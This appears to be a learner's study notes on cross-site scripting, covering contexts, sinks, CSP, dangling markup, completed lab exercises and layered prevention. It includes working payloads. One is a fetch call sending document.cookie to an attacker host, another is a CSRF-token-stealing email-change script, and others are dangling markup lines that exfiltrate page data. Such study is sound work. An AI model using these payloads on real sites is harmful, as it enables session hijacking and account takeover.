# Cross-Site Scripting (XSS)

## What is it

When an app takes user input and puts it into a page without sanitizing it, letting you inject a script that runs in another user's browser.

## Why it works

The browser can't tell the difference between the site's legitimate JavaScript and yours. If your input ends up in the HTML unescaped, the browser just executes it.

---

## The three types

### Reflected XSS

The payload is in the URL. The attacker sends the victim a crafted link and the server reflects it back in the response.

**The catch:** the attacker is praying the victim is logged in when they click. No guarantee. It's a shot in the dark send the link and hope.

### Stored XSS

The payload gets saved in the database (comment, profile field, post) and fires every time someone loads that page.

**Why it's worse:** the attacker already knows users are going to see it. They're logged in by definition  they're browsing the site. No praying required. More reliable, more dangerous.

### DOM XSS

The vulnerability lives in client-side JavaScript, not the server. The page's own JS reads from something attacker-controlled (like `location.search`) and writes it into the DOM unsafely.

The DOM is the browser's live representation of the HTML issued by the server a tree structure built after all JS has run. In DOM XSS you're not manipulating the original HTML file like in stored XSS. You're manipulating the DOM directly through the browser's own JS.

- **Ctrl+U** → original HTML the server sent, JS hasn't run yet
- **Inspect Element** → the live DOM after JS has modified everything

---

## Source and Sink

Every DOM XSS has two parts:

- **Source** - where attacker-controlled input comes from (e.g. `location.search`, `location.hash`, `document.cookie`)
- **Sink** - where that input ends up being executed or rendered (e.g. `document.write`, `innerHTML`, `eval`, `$()`)

The vulnerability exists when there's a path from source to sink with no sanitization in between. The sink determines what payload you use, different sink, different approach, same thinking.

---

## The mental model for every DOM XSS lab

1. Find the source, where is input coming from?
2. Find the sink, where does it end up?
3. Identify the context, what's wrapping your input in the DOM?
4. Close everything wrapping you
5. Inject

---

## XSS Contexts

The context is where your input lands in the page. It determines everything, what characters matter, what you need to break out of, and what payload works. Same vulnerability, completely different approach depending on context.

The core logic: every context has a "language" the browser is currently parsing. Your job is to break out of that language's current structure, then inject something the browser will execute. One approach does not fit all, you have to read the context first.

### Between HTML tags

Your input lands as raw content between tags. The browser is in HTML parsing mode, it's looking for tags and entities.

Nothing is wrapping you so no breakout needed. Just inject a tag directly.

```
<script>alert(1)</script>
<img src=1 onerror=alert(1)>
```

Why different tags work: the browser executes `<script>` blocks, but also runs event handlers on any element. `img` with a broken `src` fires `onerror` immediately. Useful when `<script>` is filtered.

### Inside an HTML attribute value

Your input lands as the value of an attribute. The browser is parsing an attribute string, it's looking for the closing quote, not for tags.

Tags injected here don't break out because the browser doesn't treat `<` as special inside an attribute value it's just a character. You have to close the attribute and the tag first, then inject.

```
// input lands in: <input value="YOUR_INPUT">
// payload:
"><script>alert(1)</script>
```

Close the quote → close the tag → now you're back in HTML context → inject freely.

**Exception, event handler attributes:** if your input lands directly inside an existing event handler like `onmouseover=""`, you're already in a JavaScript execution context. No breakout needed, just write JS directly.

```
// input lands in: <input onmouseover="YOUR_INPUT">
// payload:
alert(1)
```

**Exception, href and src attributes:** these accept URLs. Breaking out with `">` works but there's a cleaner path, `javascript:` protocol. Browser executes the JS when the link is clicked.

```
javascript:alert(1)
```

Only works on navigating attributes (href, action, iframe src). Not img src, that fetches a resource, doesn't execute JS.

### Inside a JavaScript string

Your input lands inside an existing JS string, inside a `<script>` block. The browser is already in JavaScript parsing mode, it's not looking for HTML tags at all.

Injecting `<script>` or HTML tags does nothing here. You have to break out of the string, close the script block or just execute JS directly.

```
// input lands in: var search = 'YOUR_INPUT';
// payload:
'-alert(1)-'
// or:
';alert(1)//
```

First option: close the string with `'`, inject JS, reopen the string so the rest doesn't error. Second option: terminate the statement, inject, comment out the rest.

**When angle brackets are encoded:** if `<` and `>` are HTML-encoded, you can't close the `<script>` tag and start fresh. But you're already inside a script block, you don't need to. Just break out of the string and write JS.

```
\'-alert(1)//
```

The backslash escapes the app's escape attempt if the app tries to escape your quote with `\'`, prefixing `\` turns it into `\\` which escapes the backslash itself, leaving your `'` to close the string.

### Inside a JavaScript template literal

Template literals use backticks and support `${}` expressions. Your input lands inside a backtick string.

You don't need to break out at all. `${}` is evaluated as JS inside a template literal by design.

```
// input lands in: var msg = `Hello YOUR_INPUT`;
// payload:
${alert(1)}
```

The browser sees `${}`, evaluates the contents as JavaScript, executes `alert(1)`. No tags, no string breaking, no escaping. The syntax does the work.

---

## Sinks and their payloads

### document.write

Writes raw HTML directly into the page. Browser parses it as real HTML.

- Identify what tags are open around your input
- Close them all, then inject

```
// input lands inside <option selected>HERE</option> inside <select>
// payload:
</option></select><img src=1 onerror=alert(1)>
```

### innerHTML

Same idea as document.write but won't execute `<script>` tags on modern browsers.
Use `<img>` or `<iframe>` with event handlers instead.

```
<img src=1 onerror=alert(1)>
```

### jQuery attr() - href attribute

Sets an HTML attribute value. Input is treated as a URL, not raw HTML so breaking out with tags doesn't work.
Use `javascript:` protocol instead, browsers execute JS when a link with this href is clicked.

```
?returnPath=javascript:alert(document.domain)
```

Only works on attributes that accept URLs that navigate/load pages (href, action, iframe src).
Doesn't work on img src, that just loads a resource.

### jQuery $() - selector sink

jQuery's selector function has two modes:

- Pass a CSS selector → finds existing elements on the page
- Pass an HTML string starting with `<` → creates and injects that element into the DOM

That dual behavior is the vulnerability. If user input reaches `$()` it can inject HTML.

**With hashchange (classic attack):**

```javascript
$(window).on('hashchange', function() {
    var element = $(location.hash);
    element[0].scrollIntoView();
});
```

- Source: `location.hash` (the `#` part of the URL)
- Sink: `$()` which injects HTML if input starts with `<`
- Problem: `hashchange` only fires on change, not on load - can't just send victim a crafted URL
- Solution: deliver via iframe

**Why the iframe:**

```html
<iframe src="https://vulnerable-site.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
```

1. Iframe loads vulnerable page with empty hash `#`
2. `onload` fires after page fully loads
3. Payload gets appended to hash, hash changes from `#` to `#<img src=1 onerror=alert(1)>`
4. `hashchange` fires on the vulnerable page
5. `$()` receives the hash, sees HTML, injects it into the DOM
6. `onerror` fires, alert executes

The iframe lives on the attacker's page. Victim just visits the attacker's page, the vulnerable site loads invisibly in the background. Stealthier than reflected XSS because no suspicious URL appears in the victim's address bar.

### AngularJS {{}} expression injection

When a page uses `ng-app`, AngularJS takes control of that element and evaluates anything inside `{{}}` as JavaScript.

- Look for `ng-app` attribute in page source (Ctrl+U)
- If your input lands inside an `ng-app` element, inject `{{2+2}}` to confirm - if page renders `4` you have injection
- AngularJS sandboxes direct JS calls like `alert(1)` - need a sandbox escape
- Classic escape using Angular's own internals:

```
{{$on.constructor('alert(1)')()}}
```

- `$on` - an internal Angular function that's accessible
- `.constructor` - every function's constructor is the built-in `Function` object
- `Function('alert(1)')` - builds a new function from a string (same idea as eval)
- `()` - calls it immediately

No angle brackets or event handlers needed, you're injecting an expression, not HTML.

---

## Real-world insight: dead code is dangerous

The `document.write` lab had a URL parameter (`storeId`) that was never used in normal site flow, the stock checker used POST instead. But the JS that reads `storeId` from the URL was still there, forgotten. Dead/orphaned code sitting in production, harmless looking, until someone reads the source carefully.

In real bug bounties this is a common find, developers change approach and forget to clean up old code. The vulnerability isn't in obviously bad code. It's in reasonable features with slightly wrong assumptions.

---

## Why if(store) doesn't protect anything

```javascript
if(store) {
    document.write('<option selected>'+store+'</option>');
}
```

This only checks **does a value exist**, not whether it's valid. A real fix uses whitelist validation:

```javascript
var validStores = ["London","Paris","Milan"];
if(validStores.includes(store)) {
    document.write('<option selected>'+store+'</option>');
}
```

Most injection vulnerabilities exist not because there's zero validation but because the validation checks the wrong thing.

---

## Content Security Policy (CSP)

CSP is a response header that tells the browser what it's allowed to load and run on a page. It's a second layer of defense behind output encoding, even if an injection slips through, CSP can stop it from doing anything useful.

### How it works

The server sends a `Content-Security-Policy` header. The value is a list of directives separated by semicolons, each one controlling a different category:

```
Content-Security-Policy: script-src 'self'; img-src 'self'; object-src 'none'
```

`script-src 'self'` means only scripts from the page's own origin can load or run, no inline scripts, no external script tags pointing elsewhere.

### Nonces and hashes

Instead of trusting a whole domain, CSP can trust specific scripts:

- **Nonce** - a random value generated fresh on every page load, the script tag must carry the matching `nonce="..."` attribute or it won't execute. Only works as a defense if the nonce is unpredictable and regenerated each time.
- **Hash** - CSP specifies the hash of a script's exact contents, if the script's content doesn't match that hash it won't run. Breaks if the script content ever changes without updating the hash.

### The img-src gap

Many CSPs lock down `script-src` tightly but leave `img-src` open, since images feel harmless. But an `<img src="https://attacker.com?data=...">` is still an external request, if a CSRF token or other sensitive data ends up in that URL, it gets sent to the attacker with no script execution needed at all. This is the bridge between CSP and dangling markup.

### CSP policy injection

If a site reflects user input directly into the CSP header itself (often via a `report-uri` directive, which some apps populate dynamically), you can inject a `;` to terminate that directive and add your own directives after it.

Normally you can't override an existing `script-src` this way, directives don't get replaced, they get combined with the most restrictive winning. But `script-src-elem` is more specific than `script-src` for script *elements* (not inline event handlers), and a more specific directive overrides a less specific one for the things it covers. So injecting a new `script-src-elem` directive can override the original `script-src`'s control over `<script>` tags specifically.

### Clickjacking protection

`frame-ancestors` controls whether the page can be loaded inside an iframe on another site:

```
frame-ancestors 'self'      // only same-origin framing allowed
frame-ancestors 'none'      // can't be framed at all
```

More flexible than the older `X-Frame-Options` header since it supports multiple domains and wildcards, and CSP checks the entire frame ancestry, not just the top-level frame.

---

## Dangling markup injection

A technique for capturing data cross-domain when full XSS isn't possible, CSP or filters block script execution, but you can still inject HTML elements with unclosed attributes.

### The core idea

Suppose your input lands inside an attribute:

```html
<input type="text" name="input" value="YOUR_INPUT">
```

If `>` and `"` aren't filtered, you can break out with `">`. Normally you'd go for XSS from here. But if XSS is blocked, you can instead inject a tag with a **deliberately unclosed attribute**:

```
"><img src='//attacker.com?
```

This creates an `<img>` tag whose `src` attribute is left open, no closing quote. The browser keeps reading everything that follows as part of that URL, until it hits the next `'` character anywhere later in the page's HTML. Whatever sits between your injection point and that next quote, which might be a CSRF token, session data, anything, gets swallowed into the URL and sent to the attacker's server when the browser tries to load the "image."

The attribute is left "dangling", hence the name. No JS runs, this is pure HTML parsing behavior.

### Any attribute that makes a request works

Not just `img src`. Anything that causes the browser to reach out externally, `href`, `action`, `formaction`, `background`, etc., can be abused the same way.

### Defenses

- Same as XSS - encode on output, validate on input
- `img-src 'self'` blocks the classic img-based version, but not other tags like a dangling anchor `href`
- Chrome specifically blocks `img` (and similar) tags from having raw angle brackets or newlines in their URLs, since that's exactly the content a dangling attack tries to capture - this kills most dangling markup attempts on Chrome without needing a CSP at all

---

## Exploiting XSS

`alert(1)` is proof the bug exists. The real question is what an attacker can actually do with it. The answer is almost always more than the developer thinks.

### Stealing cookies

XSS gives you code execution in the victim's browser. The victim's cookies are sitting right there in `document.cookie`. The attack is just reading that value and sending it somewhere you control.

```javascript
fetch('https://attacker.com/?c='+document.cookie)
```

Inject this as a stored XSS payload in a comment field. Every user who loads the page sends their session cookie to your server. You take the cookie, set it in your browser, you're now them.

**Why HttpOnly blocks this:** if the cookie has the HttpOnly flag, JS can't read it. `document.cookie` won't show it. This is the single most important cookie defense and why you'll often see cookie stealing combined with other techniques.

**Lab solution (understood, Burp Pro needed):** stored XSS in comment field, payload uses fetch to send `document.cookie` to Burp Collaborator, server logs the incoming request containing the victim's session token.

### Stealing passwords via autofill

Browsers autofill saved credentials into username/password fields. If you can inject a hidden form with those field types into the page, the browser fills them in automatically. Your JS then reads the values and exfiltrates them.

The victim doesn't type anything. The browser does the work for you.

**Lab solution (understood, Burp Pro needed):** stored XSS injects a fake form, browser autofills credentials, JS reads the password field value and sends it to Collaborator.

### XSS to CSRF

XSS already gives you code execution as the victim. That means you can make any HTTP request the victim could make, including state-changing ones like changing their email or password.

The difference from regular CSRF: CSRF tokens aren't a defense here. The attacker's JS runs in the victim's browser on the victim's origin, so it can read the page's source, extract the CSRF token, and include it in the forged request. CSRF protection assumes the attacker can't read the page. XSS breaks that assumption.

The attack chain:
1. XSS fires in victim's browser
2. JS makes a GET request to the account settings page
3. Response comes back, JS parses out the CSRF token from the HTML
4. JS makes a POST request to change email, with the real CSRF token included
5. Server accepts it, email changed, attacker takes over account

```javascript
fetch('/my-account')
  .then(r => r.text())
  .then(html => {
    const token = html.match(/name="csrf" value="([^"]+)"/)[1];
    return fetch('/my-account/change-email', {
      method: 'POST',
      body: 'email=attacker@evil.com&csrf=' + token
    });
  });
```

Two requests, fully automated, victim sees nothing.

**Why this matters conceptually:** CSRF tokens protect against cross-origin requests. XSS is same-origin by definition. The token defense is irrelevant once XSS exists. This is why XSS is treated as higher severity than CSRF.

---

## Dangling markup injection

A way to capture data cross-domain when full XSS isn't possible, input filters or CSP are blocking script execution, but you can still inject some HTML.

The core idea: inject a tag with an attribute that starts a URL but never closes it, leave it "dangling." The browser keeps reading everything after that point as part of the URL, until it hits the next quote character somewhere later in the page's HTML. Whatever sits between your injection point and that next quote gets sent to your server as part of the request.

```
// input lands in: <input type="text" name="input" value="CONTROLLABLE_DATA">
// payload:
"><img src='//attacker-website.com?
```

- `">` closes the attribute and the tag, back in HTML context
- `<img src='//attacker-website.com?` opens a new img tag with an unterminated `src`, starting with a single quote
- Browser looks ahead for the next `'` to close this attribute
- Everything in between (could be a CSRF token, session data, anything in the page's HTML after this point) gets swallowed into the URL and sent to attacker-website.com when the browser tries to load the "image"
- Non-alphanumeric characters including newlines get URL-encoded automatically as part of this

Any attribute that triggers an external request can be used this way, not just `img src`. The technique exists specifically for when you can inject HTML but not get JS to run.

### When all external requests are blocked

If CSP blocks `img-src` and everything else that could exfiltrate data automatically, dangling markup with `img` is dead. But some elements can still store data and only send it on user interaction. The fix becomes: inject something that captures data into an attribute, and relies on the victim clicking it to trigger the exfiltration.

---

## Content Security Policy (CSP)

A response header that restricts what a page is allowed to load and do. Sent as `Content-Security-Policy: directive1; directive2; ...`, a list of directives separated by semicolons, each one controlling a different category.

### Mitigating XSS

```
script-src 'self'
```
Only scripts from the same origin can load/execute. Inline scripts and event handlers are blocked.

```
script-src https://scripts.normal-website.com
```
Only scripts from this specific domain. Caution: if an attacker can control content on that domain (e.g. a shared CDN without per-customer paths), this whitelist is worthless.

**Nonces and hashes**, two more ways to whitelist scripts:
- Nonce: CSP specifies a random value, the `<script>` tag must carry the same value in a `nonce` attribute. Must be freshly generated and unguessable each page load to mean anything.
- Hash: CSP specifies a hash of the script's exact content. If the script changes, the hash breaks and needs updating.

**Why img often still works even with CSP locked down:** many CSPs allow `img-src` even when `script-src` is tight. This means `img` tags can still be used to leak data (like CSRF tokens) to an external server, even when scripts are fully blocked, this is the dangling markup angle.

**Chrome's dangling markup mitigation:** Chrome blocks tags like `img` from having `src` values containing raw, unencoded characters like angle brackets or newlines. Since dangling markup payloads typically capture content containing those characters, this blocks a lot of these attacks by default.

### Mitigating dangling markup

```
img-src 'self'
```
Images can only load from the same origin, blocks the classic `img src='//attacker.com?...` exfiltration.

```
img-src https://images.normal-website.com
```
Same idea, specific domain.

This stops the easiest no-interaction exfiltration method (`img`), but doesn't stop everything, an injected anchor (`<a>`) with a dangling `href` can still capture data and exfiltrate on click, since `img-src` says nothing about links.

### CSP bypass via policy injection

If a site reflects a parameter directly into its own CSP header, usually in a `report-uri` directive, and you control that parameter, you can inject a `;` to add your own directives to the policy.

Since `report-uri` is typically the last directive in the list, your injected directives need to **overwrite** earlier ones, not just append, to actually loosen restrictions.

Normally `script-src` can't be overwritten this way once set. But `script-src-elem` is a separate, newer directive, it controls script *elements* specifically (not inline event handler attributes), and critically, **it can overwrite an existing `script-src` directive**. If you inject a new `script-src-elem` directive after the original `script-src`, the new one wins for script elements, and you can set it wide open.

```
script-src-elem * 'unsafe-inline'
```
- `*` allows scripts from any external source
- `'unsafe-inline'` allows inline `<script>` tags - needed separately, `*` alone doesn't cover inline scripts

### Clickjacking protection

```
frame-ancestors 'self'
```
Only same-origin pages can frame this page.

```
frame-ancestors 'none'
```
Page can't be framed at all, by anyone.

```
frame-ancestors 'self' https://normal-website.com https://*.robust-website.com
```
More flexible than `X-Frame-Options`, supports multiple domains and wildcards, and CSP validates every frame in the ancestor chain, not just the top level. ---

## My insights

Reflected vs stored isn't just a technical difference, it's a reliability difference from the attacker's perspective. Reflected is a gamble. Stored is a guarantee. That's why stored is treated as higher severity.

Injection attacks all share the same root cause: the boundary between data and code broke down. The developer's mistake is always the same, trusting user data and mixing it with code without checking it first. SQLi, XSS, command injection, same concept, different context.

Context is everything in XSS. The same payload that works in raw HTML does nothing inside a JS string. The same payload that works in a JS string does nothing inside a template literal, because you don't need it. Each context has its own grammar. You have to speak the browser's language at that exact point in the page, not just throw angle brackets at it and hope.

---

## How to find it

- Try `<script>alert(1)</script>` in any input field
- If alert fires, you have XSS
- In DOM XSS: search source for `document.write`, `innerHTML`, `eval`, `$()` - trace where input flows
- Use Ctrl+F in Sources tab to find sinks
- Add test input to URL, search for it in Elements tab to find where it lands in the DOM
- **For context identification:** send a unique string like `xsstest123`, find it in the DOM, read what surrounds it - that tells you exactly what you need to break out of

---

## How to fix it

- Encode output - convert `<` to `&lt;` so browser treats it as text not code
- Whitelist validation - check input is exactly what you expect, not just that it exists
- Use safe sinks - `textContent` and `innerText` treat input as plain text, never parse as HTML
- Content Security Policy (CSP) as a second layer
- Never trust user input that gets rendered into the page

---

## Labs completed

### Apprentice
- Reflected XSS into HTML context, no encoding - injected `<script>alert(1)</script>` in search, fired immediately
- Stored XSS into HTML context, no encoding - injected payload in comment field, fires on every page load for every visitor
- DOM XSS in `document.write` sink using source `location.search` - input lands in document.write, broke out of surrounding tags, injected img onerror payload
- DOM XSS in `innerHTML` sink using source `location.search` - input lands in innerHTML, used img onerror payload since script tags don't execute there
- DOM XSS in jQuery anchor `href` attribute sink using `location.search` source - input lands in href attribute, used javascript: protocol payload, clicked back link to fire
- DOM XSS in jQuery selector sink using a hashchange event - delivered iframe exploit, chained hashchange event to inject HTML via $() sink
- Reflected XSS into attribute with angle brackets HTML-encoded - angle brackets encoded so no tag breakout, closed the attribute with `"` then injected onmouseover event handler
- Reflected XSS into a JavaScript string with angle brackets HTML-encoded - angle brackets encoded so no new tags, broke out of JS string with `'`, injected alert, commented out remainder with `//`

### Practitioner
- DOM XSS in `document.write` sink using source `location.search` inside a select element - found dead/orphaned code reading storeId from URL that was never used in normal flow, broke out of option and select tags with `</option></select>`, injected img onerror payload
- DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded - found ng-app on page, confirmed injection with `{{2+2}}`, used `{{$on.constructor('alert(1)')()}}` to escape Angular sandbox via Function constructor
- Reflected XSS into HTML context with most tags and attributes blocked - WAF blocking standard tags, used Burp Intruder to fuzz which tags and attributes are allowed, found custom tags with onresize work, delivered via iframe with onload setting width to trigger resize event
- Reflected XSS into HTML context with all tags blocked except custom ones - no standard tags allowed, injected custom tag with tabindex and onfocus, used `#` in URL to autofocus on load and fire the handler
- Reflected XSS with some SVG markup allowed - SVG tags not blocked, used `<svg><animatetransform onbegin=alert(1)>` since animatetransform events aren't standard HTML and slip past naive filters
- Reflected XSS in canonical link tag - input lands in a `<link rel="canonical">` href attribute inside the head, not in the body so no visible element to interact with, used accesskey attribute with a letter and single quotes to inject onclick, accesskey triggers the handler on keyboard shortcut
- Reflected XSS into a JavaScript string with single quote and backslash escaped - app escapes both `'` and `\`, prefixed `\` before the quote which turns app's `\'` into `\\` leaving `'` free to close the string, then closed the script block and opened a new one
- Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped - angle brackets encoded, can't close script tag, single quotes escaped, used `\` to escape the app's backslash and free the quote, broke out of string mid-script-block
- Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped - input lands in onclick handler inside an href attribute, HTML encoding applies so used HTML entity `&apos;` for single quote, browser decodes it before JS runs so the string breaks correctly
- Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped - everything escaped except the template literal syntax itself, used `${alert(1)}` directly since template literals evaluate expressions by design, no breakout needed
- Exploiting XSS to perform CSRF - stored XSS in comment field, payload makes a GET to account settings page, parses the CSRF token from the response HTML with a regex match, then fires a POST to change the victim's email with the real token included, CSRF protection bypassed entirely because JS runs same-origin so it can read the page freely
- Reflected XSS protected by very strict CSP, with dangling markup attack - CSP blocked all scripts and all external requests via tags like img, but had no form-action directive so forms were unrestricted, injected a button with formaction pointing to our exploit server and formmethod=get, victim has to click the button on load which sends the account form to our server carrying their CSRF token in the URL, exploit server script then loads again with the token present and auto-builds and submits a new form to change the victim's email to ours

### Expert
- Reflected XSS protected by CSP, with CSP bypass - found a `token` query parameter reflected directly into the CSP header, injected `";` to terminate the existing directive then added our own `script-src-elem * 'unsafe-inline'` directive, this is more specific than the original `script-src` for script elements so it overrides it, removing the restriction on script tags specifically, then added a second `search` parameter in the same URL containing a reflected `<script>alert(1)</script>` payload which now executes since script-src-elem allows everything - solved without looking at the writeup

### Theory understood, lab skipped (requires Burp Pro / Collaborator)
- Exploiting XSS to steal cookies - stored XSS payload reads document.cookie and exfiltrates to external server via fetch, session hijack from there
- Exploiting XSS to capture passwords - stored XSS injects hidden form fields, browser autofills saved credentials, JS reads the values and sends them out
## How to prevent XSS

Prevention isn't one thing. It's a layered approach where each layer covers the gaps in the one before it.

### Layer 1: Encode output

The primary defense. Every piece of user-controlled data that gets written into a page needs to be encoded for the context it's landing in. The browser then treats it as data, not code.

Different contexts need different encoding:

- **HTML context** (between tags): encode `<` as `&lt;`, `>` as `&gt;`, `"` as `&quot;`, `'` as `&#x27;`, `&` as `&amp;`
- **HTML attribute context**: same HTML encoding, but also make sure the attribute is always wrapped in quotes so there's nothing to break out of
- **JavaScript context**: use a proper JS encoder, not just HTML encoding. `\u0022` for `"`, `\u003c` for `<` etc. HTML encoding `<` as `&lt;` inside a script block does nothing because JS isn't looking for HTML entities
- **URL context**: percent-encode user input before putting it in a URL. Validate that href values start with `http` or `https`, not `javascript:`

The right encoding depends on where the data lands. Encoding for the wrong context either breaks the page or leaves you exposed.

### Layer 2: Validate input on arrival

Encoding handles output. Validation handles input. They're not interchangeable.

Whitelist over blacklist. Checking that an email looks like an email is more robust than trying to strip out `<script>` tags. Blacklists get bypassed constantly because attackers find representations the filter didn't anticipate. Whitelists define exactly what's allowed and reject everything else.

Input validation is a secondary defense though, not a primary one. You can't validate your way out of XSS without output encoding, because the same data often needs to be rendered back somewhere.

### Layer 3: Use safe APIs and sinks

The simplest fix for DOM XSS is not using dangerous sinks in the first place.

- Use `textContent` or `innerText` instead of `innerHTML` when inserting user data into the DOM. These treat the input as plain text and never parse it as HTML, so no tag injection is possible regardless of what the input contains.
- Avoid `document.write` entirely. It's legacy, unsafe, and has no modern use case that a safe alternative can't cover.
- Don't pass user input to `eval`, `setTimeout(string)`, `setInterval(string)`, or `new Function(string)`. These all execute strings as code.
- For `href` values, validate that the URL scheme is `http` or `https` before setting it. Never set `href` to raw user input without checking this first.

### Layer 4: Content Security Policy

CSP as a second line of defense. The idea is that even if an injection slips through encoding, CSP prevents the injected script from running.

A tight CSP for XSS prevention:

```
Content-Security-Policy: script-src 'self' 'nonce-randomvalue'; object-src 'none'; base-uri 'none';
```

- `script-src 'self'` locks scripts to same-origin
- Adding a nonce means inline scripts only run if they carry the matching nonce, blocking injected inline scripts
- `object-src 'none'` closes the Flash/plugin vector which can also execute scripts
- `base-uri 'none'` prevents injecting a `<base>` tag that would change the base URL for all relative links on the page

CSP is not a replacement for output encoding. A broken nonce implementation or a missing directive can still be bypassed, as we've seen. It's a safety net, not the primary fix.

### Why these layers together

Encoding stops the injection from being interpreted as code. Input validation catches malformed data before it enters the system. Safe sinks eliminate the dangerous code paths entirely. CSP catches whatever slips through all of that.

Real apps get XSS not because they did zero encoding, but because one context was handled differently, or one developer used innerHTML when they should have used textContent, or one template bypassed the framework's auto-encoding. Defense in depth means those individual failures don't automatically result in a successful attack.